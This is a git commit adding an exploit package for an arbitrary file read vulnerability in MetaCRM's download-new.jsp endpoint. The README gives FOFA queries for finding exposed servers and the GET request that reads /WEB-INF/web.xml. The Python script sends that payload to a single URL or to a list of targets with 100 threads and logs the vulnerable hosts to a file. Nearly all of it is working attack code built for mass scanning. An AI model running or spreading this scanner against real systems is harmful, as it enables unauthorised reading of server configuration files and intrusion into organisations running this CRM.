eaa654e72c5a5c17b30bc36f50e65613347620a9
予怡 <3058727187@qq.com>
2025-09-07 11:30:28 +0800

    Add files via upload

---
+++ 美特CRM download-new存在任意文件读取/README.md
@@ -0,0 +1,9 @@
+美特CRM download-new存在任意文件读取
+
+fofa
+
+title="MetaCRM" || body="/common/images/login/metacrm.gif" || body="MetaCRM5 loading" || body="Metasoft Co., Ltd."
+
+poc
+
+GET /business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml
---
+++ 美特CRM download-new存在任意文件读取/poc.py
@@ -0,0 +1,61 @@
+import argparse,requests,re,sys
+from multiprocessing.dummy import Pool
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+def a():
+    text="""
+███████╗██╗██╗     ███████╗    ██████╗ ███████╗ █████╗ ██████╗ 
+██╔════╝██║██║     ██╔════╝    ██╔══██╗██╔════╝██╔══██╗██╔══██╗
+█████╗  ██║██║     █████╗      ██████╔╝█████╗  ███████║██║  ██║
+██╔══╝  ██║██║     ██╔══╝      ██╔══██╗██╔══╝  ██╔══██║██║  ██║
+██║     ██║███████╗███████╗    ██║  ██║███████╗██║  ██║██████╔╝
+╚═╝     ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ 
+                                                               
+                                                         
+"""
+    print(text)
+
+def poc(target):
+    payloade="/business/common/download-new.jsp?filename=&page=/WEB-INF/web.xml"
+    headers = {
+        "Cookie": "JSESSIONID=E124F553BA7F09A9AB0BC5CD11CED6B6;",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    }
+    try:
+        res=requests.get(url=target,timeout=5,verify=False)
+        if res.status_code==200:
+            res1=requests.get(url=target+payloade,verify=False,headers=headers)
+            if '<?xml version' in res1.text:
+                print(f"[+]{target}存在任意文件读取漏洞")
+                with open("result.txt",'a',encoding="utf-8")as f:
+                    f.write(target+'\n')
+            else:
+                print(f"[-]{target}不存在该漏洞")
+        else:
+            print(f"[*]{target}访问出现问题，请手工注入")
+    except:
+        pass
+
+def main():
+    a()
+    parse=argparse.ArgumentParser(description="美特CRM download-new存在任意文件读取")
+    parse.add_argument('-u','--url',type=str,help="please input your link",dest="url")
+    parse.add_argument('-f','--file',type=str,help="please input your file",dest="file")
+    args=parse.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        urllist=[]
+        with open(args.file,'r',encoding='utf-8')as fp:
+            for i in fp.readlines():
+                urllist.append(i.strip())
+        mp=Pool(100)
+        mp.map(poc,urllist)
+        mp.close
+        mp.join
+    else:
+        print(f"Usage : Python {sys.argv[0]} -h") 
+
+if __name__=="__main__":
+    main()
